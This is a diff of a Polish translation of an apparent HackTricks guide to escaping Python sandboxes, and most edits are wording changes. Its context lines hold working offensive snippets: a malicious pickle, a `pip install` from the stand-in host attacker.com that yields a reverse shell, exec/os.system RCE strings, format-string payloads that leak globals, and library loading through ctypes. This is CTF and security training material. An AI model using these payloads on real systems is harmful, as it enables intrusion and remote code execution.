@@ -41,8 +41,7 @@ system('ls')
 ```
 Pamiętaj, że funkcje _**open**_ i _**read**_ mogą być przydatne do **czytania plików** wewnątrz piaskownicy Pythona oraz do **pisania kodu**, który możesz **wykonać**, aby **obejść** piaskownicę.
 
-> [!CAUTION]
-> Funkcja **input()** w Pythonie 2 pozwala na wykonywanie kodu Pythona przed awarią programu.
+> [!CAUTION] > Funkcja **input()** w Pythonie 2 pozwala na wykonywanie kodu Pythona przed awarią programu.
 
 Python próbuje **ładować biblioteki z bieżącego katalogu jako pierwsze** (następujące polecenie wydrukuje, skąd Python ładuje moduły): `python3 -c 'import sys; print(sys.path)'`
 
@@ -54,7 +53,7 @@ Python próbuje **ładować biblioteki z bieżącego katalogu jako pierwsze** (n
 
 Możesz znaleźć **listę wstępnie zainstalowanych** pakietów tutaj: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Zauważ, że z pickle możesz sprawić, że środowisko Pythona **zaimportuje dowolne biblioteki** zainstalowane w systemie.\
-Na przykład, następujący pickle, po załadowaniu, zaimportuje bibliotekę pip do jej użycia:
+Na przykład, następujący pickle, po załadowaniu, zaimportuje bibliotekę pip, aby jej użyć:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -67,20 +66,22 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-Aby uzyskać więcej informacji na temat działania pickle, sprawdź to: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+Dla uzyskania dodatkowych informacji na temat działania pickle, sprawdź to: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pakiet Pip
 
 Sztuczka udostępniona przez **@isHaacK**
 
-Jeśli masz dostęp do `pip` lub `pip.main()`, możesz zainstalować dowolny pakiet i uzyskać powrotną powłokę, wywołując:
+Jeśli masz dostęp do `pip` lub `pip.main()`, możesz zainstalować dowolny pakiet i uzyskać powrotny shell, wywołując:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 Możesz pobrać pakiet do stworzenia reverse shell tutaj. Proszę zauważyć, że przed użyciem powinieneś **rozpakować go, zmienić `setup.py` i wpisać swój adres IP dla reverse shell**:
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony tak, aby po wyjściu z reverse shell reszta instalacji zakończyła się niepowodzeniem, więc **nie zostawisz żadnego dodatkowego pakietu python na serwerze** po wyjściu.
@@ -90,7 +91,7 @@ Możesz pobrać pakiet do stworzenia reverse shell tutaj. Proszę zauważyć, ż
 > [!WARNING]
 > Zauważ, że exec pozwala na wieloliniowe ciągi i ";", ale eval nie (sprawdź operator walrus)
 
-Jeśli pewne znaki są zabronione, możesz użyć **hex/octal/B64** reprezentacji, aby **obejść** ograniczenie:
+Jeśli pewne znaki są zabronione, możesz użyć reprezentacji **hex/octal/B64**, aby **obejść** ograniczenie:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -151,7 +152,7 @@ Możliwe jest również ominięcie tego za pomocą innych kodowań, np. `raw_uni
 
 ## Wykonanie Pythona bez wywołań
 
-Jeśli jesteś w pułapce Pythona, która **nie pozwala na wywołania**, wciąż istnieją sposoby na **wykonanie dowolnych funkcji, kodu** i **poleceń**.
+Jeśli jesteś w pułapce Pythona, która **nie pozwala na wywołania**, istnieją nadal sposoby na **wykonywanie dowolnych funkcji, kodu** i **komend**.
 
 ### RCE z [dekoratorami](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -314,7 +315,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### Brak Wbudowanych
 
 Kiedy nie masz `__builtins__`, nie będziesz w stanie zaimportować niczego ani nawet czytać lub pisać plików, ponieważ **wszystkie funkcje globalne** (jak `open`, `import`, `print`...) **nie są załadowane**.\
-Jednak **domyślnie python ładuje wiele modułów do pamięci**. Te moduły mogą wydawać się nieszkodliwe, ale niektóre z nich **również importują niebezpieczne** funkcjonalności, które mogą być wykorzystane do uzyskania **dowolnego wykonania kodu**.
+Jednak **domyślnie python ładuje wiele modułów do pamięci**. Te moduły mogą wydawać się nieszkodliwe, ale niektóre z nich **również importują niebezpieczne** funkcjonalności, które można wykorzystać do uzyskania **dowolnego wykonania kodu**.
 
 W poniższych przykładach możesz zaobserwować, jak **nadużywać** niektóre z tych "**nieszkodliwych**" modułów załadowanych, aby **uzyskać** **niebezpieczne** **funkcjonalności** wewnątrz nich.
 
@@ -681,11 +682,11 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Zauważ, jak możesz **uzyskać dostęp do atrybutów** w normalny sposób za pomocą **kropki** jak `people_obj.__init__` oraz **elementu dict** za pomocą **nawiasów** bez cudzysłowów `__globals__[CONFIG]`.
+Zauważ, jak możesz **uzyskać dostęp do atrybutów** w normalny sposób za pomocą **kropki** jak `people_obj.__init__` i **elementu dict** z **nawiasami** bez cudzysłowów `__globals__[CONFIG]`.
 
 Zauważ również, że możesz użyć `.__dict__`, aby wyliczyć elementy obiektu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`.
 
-Inne interesujące cechy formatów ciągów to możliwość **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
+Niektóre inne interesujące cechy formatów ciągów to możliwość **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -710,7 +711,7 @@ return 'HAL 9000'
 ../python-internal-read-gadgets.md
 {{#endref}}
 
-### Ładunki ujawniające wrażliwe informacje
+### Payloady ujawniające wrażliwe informacje
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -732,9 +733,9 @@ Z [tutaj](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-
 
 ### Od formatu do RCE ładowania bibliotek
 
-Zgodnie z [**wyzwaniem TypeMonkey z tego opisu**](https://corgi.rip/posts/buckeye-writeups/) możliwe jest ładowanie dowolnych bibliotek z dysku, wykorzystując lukę w formacie łańcucha w pythonie.
+Zgodnie z [**wyzwaniem TypeMonkey z tego opisu**](https://corgi.rip/posts/buckeye-writeups/), możliwe jest ładowanie dowolnych bibliotek z dysku, wykorzystując lukę w formacie łańcucha w pythonie.
 
-Przypomnienie, za każdym razem, gdy wykonywana jest akcja w pythonie, wywoływana jest jakaś funkcja. Na przykład `2*3` wykona **`(2).mul(3)`** lub **`{'a':'b'}['a']`** będzie **`{'a':'b'}.__getitem__('a')`**.
+Przypomnienie: za każdym razem, gdy wykonywana jest akcja w pythonie, wywoływana jest jakaś funkcja. Na przykład `2*3` wykona **`(2).mul(3)`** lub **`{'a':'b'}['a']`** będzie **`{'a':'b'}.__getitem__('a')`**.
 
 Masz więcej takich przykładów w sekcji [**Wykonanie Pythona bez wywołań**](#python-execution-without-calls).
 
@@ -763,18 +764,18 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-To urządzenie pozwala na **załadowanie biblioteki z dysku**. Dlatego konieczne jest w jakiś sposób **napisanie lub przesłanie biblioteki do załadowania** poprawnie skompilowanej na zaatakowany serwer.
+To urządzenie pozwala na **załadowanie biblioteki z dysku**. Dlatego konieczne jest w jakiś sposób **napisać lub przesłać bibliotekę do załadowania** poprawnie skompilowaną na zaatakowany serwer.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Wyzwanie w rzeczywistości wykorzystuje inną podatność na serwerze, która pozwala na tworzenie dowolnych plików na dysku serwera.
+Wyzwanie w rzeczywistości wykorzystuje inną lukę w serwerze, która pozwala na tworzenie dowolnych plików na dysku serwera.
 
 ## Analiza obiektów Pythona
 
 > [!NOTE]
-> Jeśli chcesz **nauczyć się** o **bytecode Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> Jeśli chcesz **nauczyć się** o **bajtkodzie Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-W niektórych CTF możesz otrzymać nazwę **niestandardowej funkcji, w której znajduje się flaga** i musisz zobaczyć **wnętrze** **funkcji**, aby ją wydobyć.
+W niektórych CTF-ach możesz otrzymać nazwę **niestandardowej funkcji, w której znajduje się flaga** i musisz zobaczyć **wnętrze** **funkcji**, aby ją wyodrębnić.
 
 To jest funkcja do zbadania:
 ```python
@@ -805,7 +806,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Zobacz tutaj więcej miejsc do uzyskania globals**](#globals-and-locals)
+[**Zobacz tutaj więcej miejsc, aby uzyskać globals**](#globals-and-locals)
 
 ### **Dostęp do kodu funkcji**
 
@@ -897,7 +898,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bajtowy kod** funkcji (`get_flag.func_code.co_code`) i **zdekompilować** go lokalnie. Nie zobaczysz zawartości zmiennych, które są ładowane (`LOAD_CONST`), ale możesz je odgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również informuje o przesunięciu zmiennej, która jest ładowana.
+Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bytecode** funkcji (`get_flag.func_code.co_code`) i **zdekompilować** go lokalnie. Nie zobaczysz zawartości zmiennych ładowanych (`LOAD_CONST`), ale możesz je zgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również wskazuje offset zmiennej, która jest ładowana.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -965,10 +966,10 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 > 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
 > ```
 
-### Rekreacja wyciekłej funkcji
+### Odtwarzanie wyciekłej funkcji
 
 > [!WARNING]
-> W poniższym przykładzie weźmiemy wszystkie dane potrzebne do rekreacji funkcji bezpośrednio z obiektu kodu funkcji. W **prawdziwym przykładzie**, wszystkie **wartości** potrzebne do wykonania funkcji **`code_type`** to to, co **musisz wyciekować**.
+> W poniższym przykładzie weźmiemy wszystkie dane potrzebne do odtworzenia funkcji bezpośrednio z obiektu kodu funkcji. W **prawdziwym przykładzie**, wszystkie **wartości** potrzebne do wykonania funkcji **`code_type`** to to, co **musisz wyciekować**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -981,8 +982,8 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-W poprzednich przykładach na początku tego wpisu możesz zobaczyć **jak wykonać dowolny kod python za pomocą funkcji `compile`**. To jest interesujące, ponieważ możesz **wykonać całe skrypty** z pętlami i wszystkim w **jednej linii** (i moglibyśmy zrobić to samo używając **`exec`**).\
-W każdym razie, czasami może być przydatne, aby **utworzyć** **skompilowany obiekt** na lokalnej maszynie i wykonać go na **maszynie CTF** (na przykład, ponieważ nie mamy funkcji `compiled` w CTF).
+W poprzednich przykładach na początku tego posta, możesz zobaczyć **jak wykonać dowolny kod python za pomocą funkcji `compile`**. To jest interesujące, ponieważ możesz **wykonywać całe skrypty** z pętlami i wszystkim w **jednej linii** (i moglibyśmy zrobić to samo używając **`exec`**).\
+Tak czy inaczej, czasami może być przydatne, aby **utworzyć** **skompilowany obiekt** na lokalnej maszynie i wykonać go na **maszynie CTF** (na przykład, ponieważ nie mamy funkcji `compiled` w CTF).
 
 Na przykład, skompilujmy i wykonajmy ręcznie funkcję, która odczytuje _./poc.py_:
 ```python
@@ -1034,7 +1035,7 @@ Używając narzędzi takich jak [**https://www.decompiler.com/**](https://www.de
 ### Assert
 
 Python uruchomiony z optymalizacjami z parametrem `-O` usunie instrukcje assert oraz wszelki kod warunkowy zależny od wartości **debug**.\
-Dlatego sprawdzenia takie jak
+Dlatego kontrole takie jak
 ```python
 def check_permission(super_user):
 try:
@@ -1053,6 +1054,5 @@ będzie omijany
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
